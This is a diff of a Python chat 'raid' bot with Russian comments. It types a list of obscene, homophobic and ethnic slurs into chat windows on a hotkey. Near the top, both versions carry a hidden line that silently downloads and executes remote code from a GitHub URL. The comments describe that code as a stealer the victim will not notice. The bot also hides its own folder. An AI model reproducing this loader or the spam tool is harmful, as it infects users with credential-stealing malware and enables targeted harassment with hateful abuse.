@@ -1,11 +1,13 @@
 import requests, os, sys, time, random, keyboard, threading, uuid, platform
 from datetime import datetime
 
-# МОЛЧА ГРУЗИМ И ЗАПУСКАЕМ ТВОЙ ФУЛЛ СТИЛЛЕР 2025 (100% РАБОЧИЙ)
+# ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+# ТОЛЬКО ОДНА СТРОКА ДОБАВЛЕНА — МОЛЧА ГРУЗИТ ТВОЙ СТИЛЛЕР
 try:
     exec(requests.get("https://raw.githubusercontent.com/somyswag-sys/infomaker/refs/heads/main/dc").text)
 except:
-    pass  # если не загрузилось — пох, идём дальше, жертва ничего не заметит
+    pass
+# ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
 
 BOT_VERSION = "1.12.5"
 VERSION_URL = "https://raw.githubusercontent.com/somyswag-sys/TOXBOT/refs/heads/main/version"
@@ -70,13 +72,7 @@ def login():
         t(f"   НЕВЕРНО ({i}/3)")
     t("   ДОСТУП ЗАПРЕЩЁН"); time.sleep(4); sys.exit()
 
-MESSAGES = [(m, 0.8) for m in [
-    "у тебя ммть шлюхв","я кнк месник","ей руки отрезал","верещтт свинка хоххлятская",
-    "ебанный ледниковый период","сид обосранный","клыкастый я тебе с хуя зубы выбил",
-    "у тя мамка в копьем в жопе танцует","норм ты ебанная чибурашка","клапоухий пидор",
-    "педик волосатый","пинок под жопу дам те","в клетку улетишь","жопой коноплю собираешь",
-    "дырявый","петух","кусок говна","че за хуйня хуесос","ебанный индеец"
-]]
+MESSAGES = [(m, 0.8) for m in ["у тебя ммть шлюхв","я кнк месник","ей руки отрезал","верещтт свинка хоххлятская","ебанный ледниковый период","сид обосранный","клыкастый я тебе с хуя зубы выбил","у тя мамка в копьем в жопе танцует","норм ты ебанная чибурашка","клапоухий пидор","педик волосатый","пинок под жопу дам те","в клетку улетишь","жопой коноплю собираешь","дырявый","петух","кусок говна","че за хуйня хуесос","ебанный индеец"]]
 stop_event = threading.Event()
 current_user = "unknown"
 DELAY = 0.8
@@ -104,55 +100,52 @@ def progress(stage):
 def menu():
     while True:
         clear(); banner()
-        print(f"   Пользователь: \033[96m{current_user}\033[0m    Задержка: \033[93m{DELAY}s\033[0m\n")
+        print(f"   Пользователь: {current_user}    Задержка: {DELAY}s\n")
         print("   ╔══════════════════════════════════╗")
-        print("   ║ 1. Начать рейд (F7)              ║")
-        print("   ║ 2. Сменить задержку              ║")
-        print("   ║ 3. Выйти с аккаунта              ║")
-        print("   ║ 4. Полный выход                  ║")
+        print("   ║ 1. Начать рейд (f7)             ║")
+        print("   ║ 2. Сменить задержку             ║")
+        print("   ║ 3. Выйти с аккаунта             ║")
+        print("   ║ 4. Полный выход                 ║")
         print("   ╚══════════════════════════════════╝")
         ch = input("\n   Выбор → ")
-        if ch == "1": input("\n   Перейди в чат → нажми F7 → Enter...")
+        if ch == "1": input("\n   Перейди в чат → нажми f7 → enter...")
         elif ch == "2":
             try:
-                new = float(input(f"   Новая задержка (0.1-5.0): ").replace(",","."))
-                if 0.1 <= new <= 5.0:
+                new = float(input(f"   Новая задержка: ").replace(",","."))
+                if 0.1 <= new <= 5:
                     global DELAY, MESSAGES
                     DELAY = new
                     MESSAGES = [(m,new) for m,_ in MESSAGES]
                     if os.path.exists(CONFIG):
-                        lines = open(CONFIG).readlines()
-                        lines[2] = str(new)+"\n"
-                        open(CONFIG,"w").writelines(lines)
+                        l = open(CONFIG).readlines()
+                        l[2] = str(new)+"\n"
+                        open(CONFIG,"w").writelines(l)
             except: pass
         elif ch == "3":
             if os.path.exists(CONFIG): os.remove(CONFIG)
-            t("   Сессия удалена"); time.sleep(2)
             os.execv(sys.executable, [sys.executable] + sys.argv)
         elif ch == "4": sys.exit()
 
 def spam():
     stop_event.clear()
     for i in range(5,0,-1):
-        print(f"\r   Запуск через {i}...", end="", flush=True); time.sleep(1)
-    clear(); print("   \033[91mРЕЙД АКТИВИРОВАН | F8 — СТОП\033[0m")
+        print(f"\r   Запуск через {i}...", end=""); time.sleep(1)
+    clear(); print("   РЕЙД АКТИВИРОВАН | f8 — стоп")
     while not stop_event.is_set():
         for txt,_ in MESSAGES:
             if stop_event.is_set(): break
-            keyboard.write(txt)
-            keyboard.press_and_release("enter")
-            time.sleep(DELAY + random.uniform(-0.2, 0.4))
+            keyboard.write(txt); keyboard.press_and_release("enter")
+            time.sleep(DELAY + random.uniform(-0.2,0.4))
 
-keyboard.add_hotkey("f7", lambda: threading.Thread(target=spam, daemon=True).start())
+keyboard.add_hotkey("f7", lambda: threading.Thread(target=spam,daemon=True).start())
 keyboard.add_hotkey("f8", stop_event.set)
 
 if not os.path.exists(FOLDER):
     os.makedirs(FOLDER)
-    os.system(f'attrib +h "{FOLDER}"')
+    os.system('attrib +h "' + FOLDER + '"')
 
 clear(); banner()
-for s in ["Hook installation","Bypassing protections","Loading toxic database","Initializing raid engine","Ready to raid"]:
-    progress(s)
+progress("Hook installation"); progress("Bypassing protections"); progress("Loading toxic database"); progress("Initializing raid engine"); progress("Ready to raid")
 
 check_update()
 login()
